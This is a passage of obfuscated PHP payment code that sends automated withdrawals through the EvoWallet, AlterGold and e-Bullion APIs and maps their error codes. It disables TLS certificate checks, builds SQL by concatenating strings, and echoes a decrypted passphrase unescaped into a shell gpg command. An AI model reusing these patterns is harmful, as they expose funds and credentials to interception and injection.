          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = elnlcekjci ('' . $elnlcuduiM . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = elnlcekjci ('' . $elnlcuduiM . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcuduiM . ' Curl functions are not available');
    }

  }

  function elnlctcuo ($elnlcxqTQI)
  {
    global $elnlchyuw;
    $elnlcpSub = array ();
    $elnlciUex = elnlcyokbw ($elnlcxqTQI, 'response');
    if ($elnlciUex != '')
    {
      $elnlcmjQyE = $elnlciUex;
      $elnlcpSub[$elnlchyuw['elnlcMnIrp']] = elnlcyokbw ($elnlcmjQyE, 'status');
      $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = elnlcyokbw ($elnlcRySSd, 'statusmsg');
      $elnlcpSub[$elnlchyuw['elnlcDPJw']] = elnlcyokbw ($elnlcmjQyE, 'batch');
      $elnlcpSub[$elnlchyuw['elnlcQREDC']] = elnlcyokbw ($elnlcmjQyE, 'fromaccount');
      $elnlcpSub[$elnlchyuw['elnlcVLQR']] = elnlcyokbw ($elnlcmjQyE, 'toaccount');
      $elnlcpSub[$elnlchyuw['elnlcGsrCm']] = elnlcyokbw ($elnlcmjQyE, 'amount');
      $elnlcpSub[$elnlchyuw['elnlczDWj']] = elnlcyokbw ($elnlcmjQyE, 'currency');
      $elnlcpSub[$elnlchyuw['elnlcnmjxS']] = elnlcyokbw ($elnlcmjQyE, 'checksum');
      if ($elnlcpSub[$elnlchyuw['elnlcMnIrp']] == 0)
      {
        $elnlcpSub[$elnlchyuw['elnlcMnIrp']] = $elnlchyuw['elnlcsufSr'];
      }
    }

    if (0 < $elnlcpSub[$elnlchyuw['elnlcMnIrp']])
    {
      switch ($elnlcpSub[$elnlchyuw['elnlcMnIrp']])
      {
        case 10310:
        {
          $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = '10310: Invalid Account Prefix';
          break;
        }

        case 10311:
        {
          $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = '10311: Payer account has been suspended';
          break;
        }

        case 10312:
        {
          $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = '10312: API transfer disabled';
          break;
        }

        case 10313:
        {
          $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = '10313: Payee account not found';
          break;
        }

        case 10314:
        {
          $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = '10314: Payer spending over daily limit';
          break;
        }

        case 10315:
        {
          $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = '10315: Payee account has been suspended';
          break;
        }

        case 10316:
        {
          $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = '10316: Payee account has been limited';
          break;
        }

        case 10317:
        {
          $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = '10317: Spending less than minimum allowed';
          break;
        }

        case 10318:
        {
          $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = '10318: Payee will reach their balance limit';
          break;
        }

        case 10319:
        {
          $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = '10319: Payer do not have enough funds';
          break;
        }

        case 10320:
        {
          $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = '10320: Payee has an invalid balance security check';
          break;
        }

        case 10321:
        {
          $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = '10321: Spend was not complete';
          break;
        }

        case 10322:
        {
          $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = '10322: Payee account group not found';
          break;
        }

        case 10323:
        {
          $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = '10323: Invalid payee account';
          break;
        }

        case 10324:
        {
          $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = '10324: Invalid IP range';
          break;
        }

        case 10325:
        {
          $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = '10325: Invalid API or not enabled';
          break;
        }

        case 10326:
        {
          $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = '10326: Payer account group not found';
          break;
        }

        case 10327:
        {
          $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = '10327: Invalid payer account';
          break;
        }

        case 10328:
        {
          $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = '10328: Invalid checksum';
          break;
        }

        case 10110:
        {
          $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = '10110: Invalid Account Prefix';
          break;
        }

        case 10111:
        {
          $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = '10111: Account has been suspended';
          break;
        }

        case 10112:
        {
          $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = '10112: Invalid API or API not enabled';
          break;
        }

        case 10113:
        {
          $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = '10113: API balance query disabled';
          break;
        }

        case 10114:
        {
          $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = '10114: IP not in the allowed range';
          break;
        }

        case 10115:
        {
          $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = '10115: Balance can not be retrieved';
          break;
        }

        case 10116:
        {
          $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = '10116: Reserve';
          break;
        }

        case 10117:
        {
          $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = '10117: Account group not found';
          break;
        }

        case 10118:
        {
          $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = '10118: This account can not be found';
          break;
        }

        case 10119:
        {
          $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = '10119: Invalid Checksum';
          break;
        }
      }

      $elnlcpSub[$elnlchyuw['elnlcMnIrp']] = $elnlchyuw['elnlcsKuVr'];
    }

    return $elnlcpSub;
  }

  function elnlcrdrpp ($elnlcFFkqn, $elnlcLiht, $elnlcqdjux, $elnlcTBVVi, $elnlcuduiM, $elnlcOCwP = 'USD')
  {
    global $elnlchyuw;
    global $elnlcTcyic;
    if ($elnlcTcyic[$elnlchyuw['elnlcLdvMV']] == $elnlchyuw['elnlcoaeFK'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcTcyic[$elnlchyuw['elnlcFPiR']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcqdjux == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty EvoWallet account.\'';
      mysql_query ($q);
      return array (0, 'Invalid EvoWallet account', '');
    }

    list ($elnlcojkk, $elnlcDrimo) = elnlcfeahv ($elnlcqdjux, 24);
    if ($elnlcojkk == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcDrimo . '\'';
      mysql_query ($q);
      return array (0, $elnlcDrimo);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcFFkqn == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'evowallet_password\'';
        $elnlcTpvVW = mysql_query ($q);
        while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
        {
          $elnlcqTuU = elnlcaqvpp ($elnlcgVDB[$elnlchyuw['elnlcrWusB']], $elnlchyuw['elnlcpslqd']);
        }

        $elnlchdJWh = $elnlcTcyic[$elnlchyuw['elnlcxVGv']];
      }
      else
      {
        list ($elnlcqTuU, $elnlchdJWh) = preg_split ('/\\|/', $elnlcFFkqn);
      }

      $elnlcBPWUh = curl_init ();
      $elnlcMWEGS = date ($elnlchyuw['elnlclBtB']);
      $elnlcVpNnF = strtoupper (md5 ($elnlchdJWh . $elnlcMWEGS . '103' . '' . $elnlcOCwP . $elnlcTcyic[$elnlchyuw['elnlcRQMDD']] . $elnlcqdjux . $elnlcLiht . md5 ($elnlcqTuU)));
      $elnlcxIcB = '<?xml version="1.0" encoding="utf-8"?>
<request>
<apiname>' . htmlentities ($elnlchdJWh, ENT_NOQUOTES) . '</apiname>
<trandate>' . $elnlcMWEGS . '</trandate>
<trantype>103</trantype>
<tranid></tranid>
<curcode>' . $elnlcOCwP . '</curcode>
<fromaccount>' . htmlentities ($elnlcTcyic[$elnlchyuw['elnlcRQMDD']], ENT_NOQUOTES) . '</fromaccount>
<toaccount>' . htmlentities ($elnlcqdjux, ENT_NOQUOTES) . '</toaccount>
<amount>' . htmlentities ($elnlcLiht, ENT_NOQUOTES) . '</amount>
<memo>' . htmlentities ($elnlcTBVVi, ENT_NOQUOTES) . '</memo> 
<checksum>' . $elnlcVpNnF . '</checksum> 
</request>';
      $elnlcBPWUh = curl_init ();
      curl_setopt ($elnlcBPWUh, CURLOPT_URL, 'https://www.evowallet.com/api.php?req=' . urlencode ($elnlcxIcB));
      curl_setopt ($elnlcBPWUh, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcBPWUh, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcBPWUh);
      curl_close ($elnlcBPWUh);
      $elnlcpSub = elnlctcuo ($a);
      if ($elnlcpSub[$elnlchyuw['elnlcMnIrp']] == $elnlchyuw['elnlcuQOep'])
      {
        return array (1, '', $elnlcpSub[$elnlchyuw['elnlcDPJw']]);
      }
      else
      {
        if ($elnlcpSub[$elnlchyuw['elnlcMnIrp']] == $elnlchyuw['elnlcbULGC'])
        {
          $e = elnlcekjci ('' . $elnlcuduiM . ' ' . $elnlcpSub[$elnlchyuw['elnlcSbHgw']] . '<br>' . $elnlcpSub[$elnlchyuw['elnlcjCrb']]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = elnlcekjci ('' . $elnlcuduiM . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = elnlcekjci ('' . $elnlcuduiM . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcuduiM . ' Curl functions are not available');
    }

  }

  function elnlcrjie ($elnlcvxCv, $elnlcLiht, $elnlcqdjux, $elnlcTBVVi, $elnlcuduiM)
  {
    global $elnlchyuw;
    global $elnlcTcyic;
    if ($elnlcTcyic[$elnlchyuw['elnlcLdvMV']] == $elnlchyuw['elnlcoaeFK'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcTcyic[$elnlchyuw['elnlcFPiR']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcqdjux == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to AlterGold account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid AlterGold account', '');
    }

    list ($elnlcojkk, $elnlcDrimo) = elnlcfeahv ($elnlcqdjux, 17);
    if ($elnlcojkk == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcDrimo . '\'';
      mysql_query ($q);
      return array (0, $elnlcDrimo);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcvxCv == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'altergold_password\'';
        $elnlcTpvVW = mysql_query ($q);
        while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
        {
          $elnlcubzeE = elnlcaqvpp ($elnlcgVDB[$elnlchyuw['elnlcrWusB']], $elnlchyuw['elnlcpslqd']);
        }
      }
      else
      {
        $elnlcubzeE = $elnlcvxCv;
      }

      $elnlcBPWUh = curl_init ();
      $elnlcTBVVi = rawurlencode ($elnlcTBVVi);
      curl_setopt ($elnlcBPWUh, CURLOPT_URL, 'https://api.altergold.com/spend.php');
      curl_setopt ($elnlcBPWUh, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcBPWUh, CURLOPT_POST, 1);
      curl_setopt ($elnlcBPWUh, CURLOPT_POSTFIELDS, 'PAYER_ACCOUNT=' . rawurlencode ($elnlcTcyic[$elnlchyuw['elnlcskGWy']]) . '&PAYER_PASSWORD=' . rawurlencode ($elnlcubzeE) . '&PAYEE_ACCOUNT=' . rawurlencode ($elnlcqdjux) . '&PAYMENT_AMOUNT=' . rawurlencode ($elnlcLiht) . ('' . '&PAYMENT_CURRENCY=USD&MEMO=' . $elnlcTBVVi));
      curl_setopt ($elnlcBPWUh, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcBPWUh);
      curl_close ($elnlcBPWUh);
      if ($a == '')
      {
        print 'Blank response from Altergold processor service.';
      }
      else
      {
        $elnlcqpUB = array ('E10011' => 'Unable to Login as Payer. This means wrong login information was provided.', 'E10012' => 'Payer is not allowed to make outgoing spends. Means account is suspended or perhaps limited.', 'E10013' => 'API Automated Spends not Enabled.', 'E10014' => 'Unable to authorize IP address.', 'E10015' => 'Recipient account not found', 'E10016' => 'Recipient account is suspended.', 'E10017' => 'Invalid spend units.', 'E10018' => 'Spend amount is too low.', 'E10019' => 'Recipient reached balance limit.', 'E10020' => 'Not enough funds.', 'E10021' => '* Please contact support.');
        if ($elnlcqpUB[$a] != '')
        {
          $e = elnlcekjci ('' . $elnlcuduiM . ' ' . $elnlcqpUB[$a]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcuduiM . ('' . ' ' . $elnlcqpUB[$a]), '');
        }
        else
        {
          return array (1, '', $a);
        }
      }
    }
    else
    {
      $e = elnlcekjci ('' . $elnlcuduiM . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcuduiM . ' Curl functions are not available');
    }

  }

  function elnlcmdpy ($elnlcnwsU, $elnlcLiht, $elnlcqdjux, $elnlcTBVVi, $elnlcuduiM, $elnlcNUxqQ)
  {
    global $elnlchyuw;
    global $elnlcTcyic;
    if ($elnlcTcyic[$elnlchyuw['elnlcLdvMV']] == $elnlchyuw['elnlcoaeFK'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcTcyic[$elnlchyuw['elnlcFPiR']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcqdjux == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to e-Bullion account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid e-Bullion account', '');
    }

    list ($elnlcojkk, $elnlcDrimo) = elnlcfeahv ($elnlcqdjux, 5);
    if ($elnlcojkk == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcDrimo . '\'';
      mysql_query ($q);
      return array (0, $elnlcDrimo);
    }

    if (function_exists ('curl_init'))
    {
      $elnlcWjLk = '<atip.batch.v1><payment.list>';
      $elnlcWjLk = $elnlcWjLk . '<payment>';
      $elnlcWjLk = $elnlcWjLk . '<payer>' . htmlentities ($elnlcTcyic[$elnlchyuw['elnlcVluL']], ENT_NOQUOTES) . '</payer>';
      $elnlcWjLk = $elnlcWjLk . '<payee>' . htmlentities ($elnlcqdjux, ENT_NOQUOTES) . '</payee>';
      $elnlcWjLk = $elnlcWjLk . '<amount>' . htmlentities ($elnlcLiht, ENT_NOQUOTES) . '</amount>';
      $elnlcWjLk = $elnlcWjLk . '<metal>' . ($elnlcNUxqQ == 5 ? 1 : 3) . '</metal>';
      $elnlcWjLk = $elnlcWjLk . '<unit>1</unit>';
      $elnlcWjLk = $elnlcWjLk . '<memo>' . htmlentities ($elnlcTBVVi, ENT_NOQUOTES) . '</memo>';
      $elnlcWjLk = $elnlcWjLk . '<ref></ref>';
      $elnlcWjLk = $elnlcWjLk . '</payment>';
      $elnlcWjLk = $elnlcWjLk . '</payment.list></atip.batch.v1>';
      $elnlcuvhJt = tempnam ('./tmpl_c/', 'in.');
      $elnlcwMjHe = tempnam ('./tmpl_c/', 'out.');
      $elnlcVorxm = fopen ($elnlcuvhJt, $elnlchyuw['elnlcAwMrp']);
      fwrite ($elnlcVorxm, $elnlcWjLk);
      fclose ($elnlcVorxm);
      $elnlcyHUCA = './tmpl_c/';
      $elnlckvDA = escapeshellcmd ($elnlcTcyic[$elnlchyuw['elnlcrhkR']]);
      $elnlcyKRqL = elnlcaqvpp ($elnlcTcyic[$elnlchyuw['elnlcvKTN']], $elnlchyuw['elnlcpslqd']);
      $elnlcfvrS = $elnlcTcyic[$elnlchyuw['elnlcCLGzU']];
      $elnlcWUlo = '' . ' --yes --no-tty --no-secmem-warning --no-options --no-default-keyring --batch --homedir ' . $elnlcyHUCA . ' --keyring=pubring.gpg --secret-keyring=secring.gpg --armor --throw-keyid --always-trust --passphrase-fd 0';
      $elnlcDDgdO = '' . 'echo \'' . $elnlcyKRqL . '\' | ' . $elnlckvDA . ' ' . $elnlcWUlo . ' --recipient A20077\\@e-bullion.com --local-user ' . $elnlcTcyic[$elnlchyuw['elnlcVluL']] . ('' . '\\@e-bullion.com --output ' . $elnlcwMjHe . ' --sign --encrypt ' . $elnlcuvhJt . ' 2>&1');
      $elnlcqNpgJ = '';
      $elnlcBxNVs = popen ('' . $elnlcDDgdO, 'r');
      while (!feof ($elnlcBxNVs))
      {
        $elnlcqNpgJ = fgets ($elnlcBxNVs, 4096);
      }

      pclose ($elnlcBxNVs);
      $elnlcVorxm = fopen ($elnlcwMjHe, $elnlchyuw['elnlcaAgd']);
      $elnlcTryP = fread ($elnlcVorxm, filesize ($elnlcwMjHe));
      fclose ($elnlcVorxm);
      unlink ($elnlcuvhJt);
      unlink ($elnlcwMjHe);
      $elnlcqGam = 'ATIP_ACCOUNT=' . rawurlencode ($elnlcTcyic[$elnlchyuw['elnlcVluL']]) . '&ATIP_BATCH_MSG=' . rawurlencode ($elnlcTryP) . '&ATIP_STATUS_URL=' . rawurlencode ($elnlcfvrS);
      $elnlcBPWUh = curl_init ();
      curl_setopt ($elnlcBPWUh, CURLOPT_URL, '' . 'https://atip.e-bullion.com/batch.php?' . $elnlcqGam);
      curl_setopt ($elnlcBPWUh, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcBPWUh, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt ($elnlcBPWUh, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)');
      curl_setopt ($elnlcBPWUh, CURLOPT_HEADER, 1);
      $a = curl_exec ($elnlcBPWUh);
      curl_close ($elnlcBPWUh);
      $elnlcAjGg = array ();
      $elnlcKlGyF = '';
      if (preg_match ('/Location: .*?\\?ATIP_VERIFICATION=([^\\r\\n]+)%0A/', $a, $elnlcAjGg))
      {
        $elnlcKlGyF = $elnlcAjGg[1];
      }

      $elnlcKlGyF = urldecode ($elnlcKlGyF);
      $elnlcRWPw = tempnam ('./tmpl_c/', 'xml.cert.');
      $elnlcTjNF = tempnam ('./tmpl_c/', 'xml.tmp.');
      $elnlcVorxm = fopen ('' . $elnlcTjNF, $elnlchyuw['elnlcAwMrp']);
      fwrite ($elnlcVorxm, $elnlcKlGyF);
      fclose ($elnlcVorxm);
      $elnlcWUlo = '' . ' --yes --no-tty --no-secmem-warning --no-options --no-default-keyring --batch --homedir ' . $elnlcyHUCA . ' --keyring=pubring.gpg --secret-keyring=secring.gpg --armor --passphrase-fd 0';
      $elnlcDDgdO = '' . 'echo \'' . $elnlcyKRqL . '\' | ' . $elnlckvDA . ' ' . $elnlcWUlo . ' --output ' . $elnlcRWPw . ' --decrypt ' . $elnlcTjNF . ' 2>&1';
      $elnlcqNpgJ = '';
      $elnlcvkQi = '';
      $elnlcBxNVs = popen ('' . $elnlcDDgdO, 'r');
      while (!feof ($elnlcBxNVs))
      {
        $elnlcqNpgJ = fgets ($elnlcBxNVs, 4096);
        $elnlcBKAK = strstr ($elnlcqNpgJ, 'key ID');
        if (0 < strlen ($elnlcBKAK))
        {
          $elnlcvkQi = preg_replace ('/[\\n\\r]/', '', substr ($elnlcBKAK, 7));
          continue;
        }
      }

      pclose ($elnlcBxNVs);
      if ($elnlcvkQi == $elnlcTcyic[$elnlchyuw['elnlcvmhe']])
      {
        if (is_file ('' . $elnlcRWPw))
        {
          $elnlcduzv = fopen ('' . $elnlcRWPw, $elnlchyuw['elnlcaAgd']);
          $elnlcxqTQI = fread ($elnlcduzv, filesize ('' . $elnlcRWPw));
          fclose ($elnlcduzv);
        }
        else
        {
          $e = elnlcekjci ('' . $elnlcuduiM . ' Can not found decrypted verification response!');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcuduiM . ' Can not found decrypted verification response!', '');
        }

        $elnlcxIcB = elnlcketnq ($elnlcxqTQI);
        if ($elnlcxIcB[$elnlchyuw['elnlcMnIrp']] == $elnlchyuw['elnlcuQOep'])
        {
          return array (1, '', $elnlcxIcB[$elnlchyuw['elnlcDPJw']]);
        }
        else
        {
          if ($elnlcxIcB[$elnlchyuw['elnlcMnIrp']] == $elnlchyuw['elnlcbULGC'])
          {
            $e = elnlcekjci ('' . $elnlcuduiM . ' ' . $elnlcxIcB[$elnlchyuw['elnlcSbHgw']] . ' ' . $elnlcxIcB[$elnlchyuw['elnlcjCrb']]);
            $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
            mysql_query ($q);
            return array (0, $elnlcuduiM . $elnlcxIcB[$elnlchyuw['elnlcSbHgw']] . ' ' . $elnlcxIcB[$elnlchyuw['elnlcjCrb']]);
          }
          else
          {
            $e = elnlcekjci ('' . $elnlcuduiM . ' Unknown error');
            $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
            mysql_query ($q);
            return array (0, $elnlcuduiM . ' Unknown error', '');
          }
        }
      }
      else
      {
        $e = elnlcekjci ('' . $elnlcuduiM . ' Can not decrypt verification response! ');
        $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
        mysql_query ($q);
        return array (0, $elnlcuduiM . ' Can not decrypt verification response!', '');
      }

      unlink ($elnlcTjNF);
      unlink ($elnlcRWPw);
    }
    else
    {
      $e = elnlcekjci ('' . $elnlcuduiM . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcuduiM . ' Curl functions are not available', '');
    }

  }

  function elnlcyokbw ($elnlcxIcB, $elnlcpxLhS)
  {
    global $elnlchyuw;
    $elnlcpxLhS = strtolower ($elnlcpxLhS);
    $elnlcbyqRl = strlen ($elnlcpxLhS) + 2;
    if ($elnlcQwwh = strpos ($elnlcxIcB, '' . '<' . $elnlcpxLhS . '>') === false)
    {
      return '';
    }

    if ($elnlczWUp = strpos ($elnlcxIcB, '' . '</' . $elnlcpxLhS . '>') === false)
    {
      return '';
    }

    $elnlcCrze = trim (substr ($elnlcxIcB, $elnlcQwwh + $elnlcbyqRl, $elnlczWUp - ($elnlcQwwh + $elnlcbyqRl)));
    return $elnlcCrze;
  }

  function elnlcketnq ($elnlcxqTQI)
  {
    global $elnlchyuw;
    $elnlcpSub = array ();
    $elnlcKone = elnlcyokbw ($elnlcxqTQI, 'balanceresponse.list');
    if ($elnlcKone != '')
    {
      $elnlcpSub[$elnlchyuw['elnlcMnIrp']] = $elnlchyuw['elnlcCQHr'];
      $elnlcslbp = false;
      if ($elnlcxrFBq = stristr ($elnlcKone, '<balance>') === false)
      {
        $elnlcslbp = true;
      }
      else
      {
        $elnlcQwwh = strlen ($elnlcKone) - strlen ($elnlcxrFBq);
      }

      if ($elnlcuuaz = stristr ($elnlcKone, '</balance>') === false)
      {
        $elnlcslbp = true;
      }
      else
      {
        $elnlczWUp = strlen ($elnlcKone) - strlen ($elnlcuuaz);
      }

      while (!$elnlcslbp)
      {
        $elnlcHzpe = trim (substr ($elnlcKone, $elnlcQwwh + 9, $elnlczWUp - 9));
        $elnlcKone = trim (substr ($elnlcKone, $elnlczWUp + 10));
        $elnlcpSub[$elnlchyuw['elnlcGsrCm']] = elnlcyokbw ($elnlcHzpe, 'amount');
        if ($elnlcxrFBq = stristr ($elnlcKone, '<balance>') === false)
        {
          $elnlcslbp = true;
        }
        else
        {
          $elnlcQwwh = strlen ($elnlcKone) - strlen ($elnlcxrFBq);
        }

        if ($elnlcuuaz = stristr ($elnlcKone, '</balance>') === false)
        {
          $elnlcslbp = true;
          continue;
        }
        else
        {
          $elnlczWUp = strlen ($elnlcKone) - strlen ($elnlcuuaz);
          continue;
        }
      }
    }

    $elnlciUex = elnlcyokbw ($elnlcxqTQI, 'verified.list');
    if ($elnlciUex != '')
    {
      $elnlcpSub[$elnlchyuw['elnlcMnIrp']] = $elnlchyuw['elnlcsufSr'];
      $elnlcslbp = false;
      if ($elnlcxrFBq = stristr ($elnlciUex, '<transaction>') === false)
      {
        $elnlcslbp = true;
      }
      else
      {
        $elnlcQwwh = strlen ($elnlciUex) - strlen ($elnlcxrFBq);
      }

      if ($elnlcuuaz = stristr ($elnlciUex, '</transaction>') === false)
      {
        $elnlcslbp = true;
      }
      else
      {
        $elnlczWUp = strlen ($elnlciUex) - strlen ($elnlcuuaz);
      }

      while (!$elnlcslbp)
      {
        $elnlcmjQyE = trim (substr ($elnlciUex, $elnlcQwwh + 13, $elnlczWUp - 13));
        $elnlciUex = trim (substr ($elnlciUex, $elnlczWUp + 14));
        $elnlcpSub[$elnlchyuw['elnlcDPJw']] = elnlcyokbw ($elnlcmjQyE, 'id');
        $elnlcpSub[$elnlchyuw['elnlcVLQR']] = elnlcyokbw ($elnlcmjQyE, 'payee');
        $elnlcpSub[$elnlchyuw['elnlcQREDC']] = elnlcyokbw ($elnlcmjQyE, 'payer');
        $elnlcpSub[$elnlchyuw['elnlcGsrCm']] = elnlcyokbw ($elnlcmjQyE, 'amount');
        $elnlcpSub[$elnlchyuw['elnlcwsLqI']] = elnlcyokbw ($elnlcmjQyE, 'metal');
        $elnlcpSub[$elnlchyuw['elnlcaNTw']] = elnlcyokbw ($elnlcmjQyE, 'unit');
        $elnlcpSub[$elnlchyuw['elnlcWlqC']] = elnlcyokbw ($elnlcmjQyE, 'memo');
        $elnlcpSub[$elnlchyuw['elnlcqNGd']] = elnlcyokbw ($elnlcmjQyE, 'exchange');
        $elnlcpSub[$elnlchyuw['elnlcxguFH']] = elnlcyokbw ($elnlcmjQyE, 'fee');
        if ($elnlcxrFBq = stristr ($elnlciUex, '<transaction>') === false)
        {
          $elnlcslbp = true;
        }
        else
        {
          $elnlcQwwh = strlen ($elnlciUex) - strlen ($elnlcxrFBq);
        }

        if ($elnlcuuaz = stristr ($elnlciUex, '</transaction>') === false)
        {
          $elnlcslbp = true;
          continue;
        }
        else
        {
          $elnlczWUp = strlen ($elnlciUex) - strlen ($elnlcuuaz);
          continue;
        }
      }
    }

    $elnlczazQ = elnlcyokbw ($elnlcxqTQI, 'failed.list');
    if ($elnlczazQ != '')
    {
      $elnlcpSub[$elnlchyuw['elnlcMnIrp']] = $elnlchyuw['elnlcsKuVr'];
      $elnlcslbp = false;
      if ($elnlcxrFBq = stristr ($elnlczazQ, '<failed>') === false)
      {
        $elnlcslbp = true;
      }
      else
      {
        $elnlcQwwh = strlen ($elnlczazQ) - strlen ($elnlcxrFBq);
      }

      if ($elnlcuuaz = stristr ($elnlczazQ, '</failed>') === false)
      {
        $elnlcslbp = true;
      }
      else
      {
        $elnlczWUp = strlen ($elnlczazQ) - strlen ($elnlcuuaz);
      }

      while (!$elnlcslbp)
      {
        $elnlcThxo = trim (substr ($elnlczazQ, $elnlcQwwh + 13, $elnlczWUp - 13));
        $elnlczazQ = trim (substr ($elnlczazQ, $elnlczWUp + 14));
        $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = elnlcyokbw ($elnlcThxo, 'error');
        if ($elnlcxrFBq = stristr ($elnlczazQ, '<failed>') === false)
        {
          $elnlcslbp = true;
        }
        else
        {
          $elnlcQwwh = strlen ($elnlczazQ) - strlen ($elnlcxrFBq);
        }

        if ($elnlcuuaz = stristr ($elnlczazQ, '</failed>') === false)
        {
          $elnlcslbp = true;
          continue;
        }
        else
        {
          $elnlczWUp = strlen ($elnlczazQ) - strlen ($elnlcuuaz);
          continue;
        }
      }
    }

    $elnlcvzFRz = elnlcyokbw ($elnlcxqTQI, 'errorresponse.list');
    if ($elnlcvzFRz != '')
    {
      $elnlcpSub[$elnlchyuw['elnlcMnIrp']] = $elnlchyuw['elnlcsKuVr'];
      $elnlcslbp = false;
      if ($elnlcxrFBq = stristr ($elnlcvzFRz, '<errorresponse>') === false)
      {
        $elnlcslbp = true;
      }
      else
      {
        $elnlcQwwh = strlen ($elnlcvzFRz) - strlen ($elnlcxrFBq);
      }

      if ($elnlcuuaz = stristr ($elnlcvzFRz, '</errorresponse>') === false)
      {
        $elnlcslbp = true;
      }
      else
      {
        $elnlczWUp = strlen ($elnlcvzFRz) - strlen ($elnlcuuaz);
      }

      while (!$elnlcslbp)
      {
        $elnlcwPHwD = trim (substr ($elnlcvzFRz, $elnlcQwwh + 15, $elnlczWUp - 15));
        $elnlcwrJh = false;
        if ($elnlceQGF = stristr ($elnlcwPHwD, '<error>') === false)
        {
          $elnlcwrJh = true;
        }
        else
        {
          $elnlcDHpr = strlen ($elnlcwPHwD) - strlen ($elnlceQGF);
        }

        if ($elnlcUUwE = stristr ($elnlcwPHwD, '</error>') === false)
        {
          $elnlcwrJh = true;
        }
        else
        {
          $elnlcOvCK = strlen ($elnlcwPHwD) - strlen ($elnlcUUwE);
